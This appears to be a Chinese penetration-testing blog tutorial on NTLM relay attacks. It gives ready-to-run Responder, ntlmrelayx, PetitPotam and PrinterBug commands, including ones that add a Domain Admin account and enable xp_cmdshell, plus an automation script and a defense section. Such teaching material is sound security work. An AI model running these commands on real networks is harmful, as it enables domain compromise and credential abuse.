---
title: NTLM中继攻击实战
date: 2025-03-05 08:00:00
tags:
  - 内网渗透
  - 渗透测试
description: NTLM 中继攻击——Responder 监听、ntlmrelayx 中继与强制认证利用。
categories: 渗透测试
---

## 概述

NTLM中继攻击（NTLM Relay Attack）是内网渗透中最经典、最有效的攻击手段之一。攻击者通过中间人技术截获目标主机的NTLM认证请求，并将其中继到其他未开启SMB签名的服务，从而实现横向移动和权限提升。本文从协议原理出发，系统演示Responder配合ntlmrelayx的完整攻击链，涵盖SMB/HTTP/LDAP/MSSQL多协议中继及PrinterBug、PetitPotam等强制认证技术。

## 免责声明

> **本文仅供安全研究和授权测试使用。未经授权对他人系统实施本文所述技术属于违法行为，读者须自行承担所有法律责任。**

## 一、NTLM认证协议原理

### 1.1 认证流程

NTLM采用挑战-响应机制，三次握手完成认证：

```
客户端(Client)                        服务端(Server)
    |---(1) NEGOTIATE_MESSAGE ------------->|  协商NTLM版本与能力
    |<--(2) CHALLENGE_MESSAGE --------------|  下发16字节随机Challenge
    |---(3) AUTHENTICATE_MESSAGE ---------->|  Net-NTLM Hash响应
    |<--(4) 认证结果 -----------------------|  成功/失败
```

1. **Negotiate**：客户端声明支持的NTLM版本、会话签名能力等。
2. **Challenge**：服务端生成16字节随机Challenge发送给客户端。
3. **Authenticate**：客户端使用密码的NT Hash对Challenge做HMAC_MD5运算，生成Net-NTLM Hash作为响应。
4. **验证**：服务端将响应转发给域控或与本地SAM比对。

### 1.2 NTLMv1 vs NTLMv2

| 特性 | NTLMv1 | NTLMv2 |
|------|--------|--------|
| 响应长度 | 24字节 | 可变（含时间戳） |
| 抗暴力破解 | 弱 | 强 |
| 内嵌目标信息 | 无 | 含SPN |
| Windows默认 | 已禁用 | 已启用 |

NTLMv2响应虽嵌入了目标服务名，但很多服务未严格校验，中继攻击仍然有效。**核心认知：中继攻击转发的不是密码，而是整个认证消息，攻击者无需破解Hash。**

## 二、SMB签名——中继攻击的命门

SMB签名通过在每条消息尾部附加会话密钥派生的数字签名来防篡改和防中继。目标服务器若强制签名则中继不可行。

| 发起方签名 | 目标方签名 | 可中继 |
|-----------|-----------|--------|
| 不强制 | 不强制 | **可中继** |
| 不强制 | 强制 | 不可中继 |
| 强制 | 强制 | 不可中继 |

**探测工具：**

```bash
# CrackMapExec 生成可中继列表
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Impacket RunFinger
python3 RunFinger.py -i 192.168.1.0/24

# nmap
nmap --script smb2-security-mode -p445 192.168.1.0/24
```

输出中 `signing:False` 即为可中继目标。

## 三、Responder：名称解析毒化

当内网主机名称解析失败时，会降级查询LLMNR（UDP 5355）、NBT-NS（UDP 137）、mDNS（UDP 5353）。Responder监听这些广播请求并伪造响应，诱骗受害者向攻击者发起NTLM认证。

```bash
# 全协议毒化
sudo responder -I eth0 -rdwv

# 纯毒化模式（关闭SMB/HTTP服务端，配合ntlmrelayx使用）
sudo responder -I eth0 -A

# WPAD代理投毒
sudo responder -I eth0 -wFb
```

**关键配置**（`/etc/responder/Responder.conf`）：将SMB和HTTP设为Off以释放端口给ntlmrelayx，保持LLMNR、NBT-NS、MDNS、WPAD为On。

| 协议 | 端口 | 触发条件 |
|------|------|---------|
| LLMNR | UDP 5355 | DNS失败，Windows默认启用 |
| NBT-NS | UDP 137 | NetBIOS名称查询 |
| mDNS | UDP 5353 | macOS/Linux |
| WPAD | 自动发现 | 浏览器代理自动配置 |

## 四、ntlmrelayx：中继攻击核心引擎

```bash
# 安装
pip3 install impacket
# 或 git clone https://github.com/fortra/impacket && cd impacket && pip3 install .
```

### 4.1 中继到SMB

```bash
# 从文件读取目标列表
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# 指定单目标 + 开启SOCKS代理留存会话
sudo impacket-ntlmrelayx -t 192.168.1.50 -smb2support -socks

# 执行命令
sudo impacket-ntlmrelayx -tf targets.txt -c "whoami"
```

### 4.2 中继到HTTP

```bash
sudo impacket-ntlmrelayx -t 192.168.1.50 -http-port 8080 -i
# 收到连接后 nc 127.0.0.1 11000 获取交互shell
```

### 4.3 中继到LDAP（高危）

LDAP中继可直接修改Active Directory对象：

```bash
# 转储ADCS
sudo impacket-ntlmrelayx -t ldap://dc01.corp.local --dump-adcs

# 基于资源的约束委派（RBCD）攻击
sudo impacket-ntlmrelayx -t ldap://dc01.corp.local \
    --delegate-access --escalate-user "attacker-machine\$"

# 添加域管（需高权限账户触发认证）
sudo impacket-ntlmrelayx -t ldap://dc01.corp.local \
    --add-user relayadmin Relay@Passw0rd --add-group "Domain Admins"
```

### 4.4 中继到MSSQL

```bash
sudo impacket-ntlmrelayx -t mssql://192.168.1.100:1433 \
    -q "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

## 五、强制认证——主动触发NTLM请求

除了被动等待毒化命中，还可通过Windows RPC接口主动强制目标发起认证。

### 5.1 PrinterBug（MS-RPRN）

利用打印后台处理程序RPC接口，调用`RpcRemoteFindFirstPrinterChangeNotificationEx`将攻击者IP设为通知回调地址：

```bash
python3 printerbug.py corp.local/user:password@192.168.1.50 192.168.1.99
# 参数：目标IP → 攻击者IP
```

### 5.2 PetitPotam（MS-EFSRPC）

利用加密文件系统远程协议，传入恶意UNC路径`\\192.168.1.99\share\file`，目标SYSTEM账户即发起NTLM认证：

```bash
python3 petitpotam.py -d corp.local -u user -p password 192.168.1.99 192.168.1.50
# 参数：攻击者IP → 目标IP
```

### 5.3 DFSCrack

通过`NetrDfsAddStdRoot`接口添加指向攻击者的DFS根，触发认证：

```bash
python3 dfscrack.py 192.168.1.50 192.168.1.99
```

### 5.4 对比总结

| 方法 | 所需权限 | 触发账户 | 覆盖范围 |
|------|---------|---------|---------|
| PrinterBug | 任意域用户 | 计算机账户 | 广 |
| PetitPotam | 任意域用户 | SYSTEM | 广 |
| DFSCrack | 任意域用户 | 计算机账户 | 窄 |

## 六、WPAD投毒攻击

浏览器自动发现代理时，依次通过DHCP、DNS、LLMNR查询`wpad`主机。Responder响应并返回恶意wpad.dat，将自身设为代理，浏览器通过代理发请求时触发NTLM认证。

```
受害者浏览器
     |  (1) 查询WPAD服务器
     v
Responder冒充WPAD → 返回 wpad.dat: PROXY 攻击者IP:3128
     |
     v
浏览器配置代理 → HTTP请求经代理 → 攻击者要求NTLM认证
     |
     v
浏览器自动发送Net-NTLM Hash → ntlmrelayx中继到目标
```

```bash
sudo responder -I eth0 -wFb   # -w:WPAD代理 -F:强制认证 -b:Basic认证头
```

## 七、完整攻击链演示

### 7.1 场景拓扑

```
[Kali 192.168.1.99]  ----------->  [DC01 192.168.1.2]  SMB签名: True
       | 中继
       v
[FILE01 192.168.1.50]  <---------  [WIN10 192.168.1.100]
 SMB签名: False                    Domain Admin已登录
```

### 7.2 攻击步骤

**终端1 — Responder毒化：**
```bash
sudo responder -I eth0 -A
```

**终端2 — ntlmrelayx中继：**
```bash
# SMB中继 + SOCKS代理留存
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# 或 LDAP RBCD攻击
sudo impacket-ntlmrelayx -t ldap://192.168.1.2 \
    --delegate-access --escalate-user "attacker-machine\$"
```

**终端3 — 触发强制认证：**
```bash
python3 petitpotam.py -d corp.local -u user -p 'Passw0rd' \
    192.168.1.99 192.168.1.50
```

**利用中继结果：**
```bash
# SMB中继 → SOCKS代理
proxychains crackmapexec smb 192.168.1.50 -u 'FILE01$' -p '' --shares

# LDAP RBCD → 申请ST票据
impacket-getST -spn cifs/FILE01.corp.local -impersonate Administrator \
    corp.local/'attacker-machine$' -no-pass
export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass Administrator@FILE01.corp.local
```

### 7.3 自动化脚本

```bash
#!/bin/bash
ATTACKER_IP="192.168.1.99"
TARGETS="relay_targets.txt"

crackmapexec smb 192.168.1.0/24 --gen-relay-list $TARGETS
sudo responder -I eth0 -A &
sleep 2
sudo impacket-ntlmrelayx -tf $TARGETS -smb2support -socks &
sleep 3
echo "[*] 触发: python3 petitpotam.py <target> $ATTACKER_IP"
echo "[*] 连接: proxychains bash"
```

## 八、防御与加固

**核心措施：**

1. **强制SMB签名** — 组策略 `Microsoft网络服务器: 对通信进行数字签名(始终) = 已启用`
2. **禁用LLMNR/NBT-NS** — 组策略 `关闭多播名称解析 = 已启用`，禁用NetBIOS over TCP/IP
3. **启用EPA** — 对LDAP/HTTP强制Channel Binding Token验证
4. **补丁管理** — 修复MS-RPRN、MS-EFSRPC相关漏洞
5. **网络分段** — 限制非必要的东西向SMB/RPC流量

**检测特征：**

| 检测点 | 日志来源 | Event ID |
|--------|---------|----------|
| LLMNR/NBT-NS异常响应 | Sysmon | 22 |
| 大量NTLM认证失败 | Security | 4625 |
| 异常UNC路径访问 | Sysmon | 3 |
| EFSRPC异常调用 | Security | 5140 |
| 非授权WPAD请求 | 防火墙/代理 | HTTP 407 |

## 九、工具速查

| 工具 | 用途 | 关键参数 |
|------|------|---------|
| `responder` | 名称解析毒化 | `-I eth0 -A` |
| `impacket-ntlmrelayx` | NTLM中继引擎 | `-tf targets -smb2support -socks` |
| `crackmapexec` | SMB签名扫描 | `--gen-relay-list` |
| `printerbug.py` | PrinterBug强制认证 | `domain/user:pass@target attacker` |
| `petitpotam.py` | EFSRPC强制认证 | `attacker_ip target_ip` |
| `RunFinger.py` | SMB签名探测 | `-i 192.168.1.0/24` |

## 十、总结

NTLM中继攻击的威力根植于协议设计缺陷——认证消息可被透明转发而无需知晓原始凭据。本文从NTLM认证流程出发，覆盖了SMB签名探测、Responder毒化、SMB/HTTP/LDAP/MSSQL多协议中继、PrinterBug/PetitPotam/DFSCrack强制认证、WPAD投毒等关键技术。

**关键要点：**
1. 中继不等于破解 — 转发整个认证会话即可，无需离线破解Hash
2. 签名是命门 — 目标未强制SMB签名是成功的根本前提
3. LDAP中继危害最大 — 可直接添加域管、配置委派权限
4. 强制认证扩展攻击面 — 即使网络安静也能主动触发
5. 防御核心 — SMB签名 + 禁用LLMNR/NBT-NS + EPA + 及时补丁

> **再次声明：本文所有内容仅供安全研究与授权测试参考，严禁用于非法入侵。请严格遵守《网络安全法》及相关法律法规。**
